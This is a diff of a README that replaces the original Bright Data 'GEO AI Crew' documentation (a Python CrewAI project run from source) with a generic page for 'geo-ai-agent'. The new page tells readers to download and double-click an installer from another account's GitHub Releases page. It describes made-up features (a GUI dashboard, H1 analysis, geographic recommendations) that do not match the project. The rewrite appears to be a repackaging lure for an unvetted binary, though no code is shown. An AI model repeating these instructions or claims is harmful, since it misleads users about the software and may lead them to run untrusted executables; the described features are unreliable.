@@ -1,114 +1,80 @@
-<p align="center">
-  <a href="https://brightdata.com/">
-    <img src="https://mintlify.s3.us-west-1.amazonaws.com/brightdata/logo/light.svg" width="300" alt="Bright Data Logo">
-  </a>
-</p>
+# 🌟 geo-ai-agent - Optimize Website Content with AI
 
-<div align="center">
-  <img src="https://img.shields.io/badge/python-3.10+-blue"/>
-  <img src="https://img.shields.io/badge/License-MIT-blue"/>
-</div>
+## 🚀 Getting Started
 
----
+Welcome to geo-ai-agent! This AI-powered tool helps you audit and enhance your website content. It crawls URLs, examines titles, and suggests actionable GEO recommendations using CrewAI. Follow the simple steps below to set it up.
 
-# 🚀 GEO AI Crew
+## 💾 Download & Install
 
-GEO Agent Crew uses [CrewAI](https://crewai.com) to automate AI-driven webpage content audits. Enter a URL, and the system accesses the webpage, extracts its title, generates and summarizes related queries using [Gemini with the Google Search tool](https://ai.google.dev/gemini-api/docs/google-search), fetches Google AI Overviews via [Bright Data SERP API](https://brightdata.com/products/serp-api), compares results, and outputs actionable page-level optimization suggestions in Markdown file.
+To get started, you'll need to download the software. Click the button below to visit the Releases page and download the latest version:
 
-<img src="https://github.com/brightdata/geo-ai-agent/blob/main/GEO%20diagram.png"/>
+[![Download geo-ai-agent](https://img.shields.io/badge/Download%20geo--ai--agent-blue.svg)](https://github.com/RAJ-GIT011/geo-ai-agent/releases)
 
----
+Visit this page to download the software: [geo-ai-agent Releases](https://github.com/RAJ-GIT011/geo-ai-agent/releases).
 
-## 🤖 Understanding Your Crew
+## 📋 System Requirements
 
-The `ai-content-optimization-agent` Crew is composed of six AI agents, each with unique roles, goals, and tools. These agents collaborate on a series of tasks, defined in `config/tasks.yaml`, leveraging their collective skills to achieve complex objectives. The `config/agents.yaml` file outlines the capabilities and configurations of each agent in your crew.
+Before you install, make sure your computer meets the following requirements:
 
-## 🛠️ Installation
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **Python Version:** Python 3.7 or later.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum of 100 MB of free space.
 
-Ensure you have **Python >=3.10 <3.14** installed on your system.
+## 🛠 Installation Steps
 
-This project uses [`uv`](https://docs.astral.sh/uv/) for dependency management and package handling.
-First, if you haven't already, install `uv`:
+Follow these steps to install geo-ai-agent on your computer:
 
-```bash
-pip install uv
-```
+1. **Visit the Releases Page:**
+   Go to the [geo-ai-agent Releases](https://github.com/RAJ-GIT011/geo-ai-agent/releases) page.
 
-Next, navigate to your project directory and install the project's dependencies:
+2. **Download the Latest Version:**
+   Locate the latest version of geo-ai-agent. Click on the file suitable for your operating system and start the download.
 
-```bash
-cd geo-ai-agent
-uv sync
-```
+3. **Run the Installer:**
+   Once the download finishes, find the file in your Downloads folder. Double-click the file to run the installer.
 
----
+4. **Follow the Installation Prompts:**
+   Follow the on-screen instructions. Choose your preferred installation location and click to install.
 
-## 🔑 Environment Configuration
+5. **Launch the Application:**
+   After installation, you can find geo-ai-agent in your applications list. Click to open it.
 
-This project requires four environment variables to work:
-- **`GEMINI_API_KEY`**: Your Gemini API key.
-- **`MODEL`**: The name of the Gemini model to power your crew of agents (e.g., `gemini/gemini-2.5-flash`).
-- **`BRIGHT_DATA_API_KEY`**: Your [Bright Data API key](https://docs.brightdata.com/api-reference/authentication).
-- **`BRIGHT_DATA_ZONE`**: The name of the [Web Unlocker zone in your Bright Data dashboard](https://docs.brightdata.com/scraping-automation/web-unlocker/quickstart) you want to connect to.
+## 🧭 Using geo-ai-agent
 
-Define them directly in your terminal or place them in a `.env` file at the root of your project:
-```
-geo-ai-agent/
-├── ...
-├── .env # <---
-└── src/
-    └── ai_content_optimization_agent/
-        └── ...
-```
-Populate the `.env` file like this:
-```
-GEMINI_API_KEY="<YOUR_GEMINI_API_KEY>"
-MODEL="<CHOSEN_GEMINI_MODEL>"
-BRIGHT_DATA_API_KEY="<BRIGHT_DATA_API_KEY>"
-BRIGHT_DATA_ZONE="<YOUR_BRIGHT_DATA_ZONE>"
-```
+Now that you have installed geo-ai-agent, here’s how to use it effectively:
 
-## ▶️ Running the Project
-Activate the `.venv` created by the `uv sync` command:
-```bash
- source .venv/bin/activate
-```
-Or, on Windows:
-```powershell
-.venv/Scripts/activate
-```
+1. **Start your Application:**
+   Open geo-ai-agent from your applications menu.
 
-With the virtual environment activated, start your crew of AI agents by running the following command from the root folder of your project:
+2. **Input the URL to Crawl:**
+   In the main dashboard, enter the URL of the website you want to audit. Click "Crawl" to begin.
 
-```bash
-crewai run
-```
+3. **View Analysis Results:**
+   The tool will analyze the H1 tags and other elements of the website. You will see recommendations and insights on how to improve content.
 
-This command initializes the `ai-content-optimization-agent` crew, assembling the agents and assigning them tasks as defined in the CrewAI configuration files.
+4. **Take Action on Recommendations:**
+   Review the suggestions provided by geo-ai-agent. Implement the changes on your website to optimize it for search engines.
 
-☑️ This application will produce a `output/report.md` file, along with other `ouput/*.md` files containing intermediate data and results from the agents.
+## 🔍 Features of geo-ai-agent
 
----
+geo-ai-agent comes packed with features to streamline your SEO tasks:
 
-### ⚙️ Customizing
-- 🔧 Update the `MODEL` environment variable to change the Gemini model used by this crew of agents.
-- 🧑‍💻 Edit `src/ai_content_optimization_agent/config/agents.yaml` to modify the definitions of the agents. 
-- 📋 Edit `src/ai_content_optimization_agent/config/tasks.yaml` to modify the definitions of the tasks assigned to the agents. 
-- 🛠️ Update `src/ai_content_optimization_agent/crew.py` to integrate other AI models or add your own logic and tools.
-- ⚡ Edit `src/ai_content_optimization_agent/main.py` to add custom inputs for your agents and tasks.
+- **URL Crawling:** Efficiently crawl multiple URLs to gather data.
+- **H1 Tag Analysis:** Review and optimize your H1 tags for better SEO performance.
+- **GEO Recommendations:** Get customized suggestions based on geographic data to target your audience better.
+- **User-Friendly Interface:** Simple navigation ensures you can manage your website audits easily.
 
----
+## 🎉 Contributing
 
-## 💬 Support
+We welcome contributions! If you want to help enhance geo-ai-agent, please visit our contribution guidelines in the repository. Your feedback and suggestions are always welcome.
 
-For support, questions, or feedback regarding the `ai-content-optimization-agent` Crew or CrewAI:
+## 📞 Support
 
-- ☀️ Visit Bright Data's [SERP API docs](https://docs.brightdata.com/scraping-automation/serp-api/introduction)
-- 📖 Visit CrewAI's [documentation](https://docs.crewai.com)
-- 🐙 Reach out to CrewAI through the [GitHub repository](https://github.com/joaomdmoura/crewai)
-- 💬 [Join Discord](https://discord.com/invite/X4JWnZnxPb)
-- 💡 [Chat with CrewAI's docs](https://chatg.pt/DWjSBZn)
+If you encounter any issues or have questions about geo-ai-agent, please open an issue on GitHub. We’re here to help!
 
----
+## 🌐 Learn More
 
-✨ Let's create wonders together with the power and simplicity of Bright Data & CrewAI.
+For additional resources and documentation, check out the wiki section of our GitHub repository or our official website. Stay updated with our latest features and improvements.
+
+Thank you for using geo-ai-agent! We hope this tool helps you enhance your website's content effortlessly.
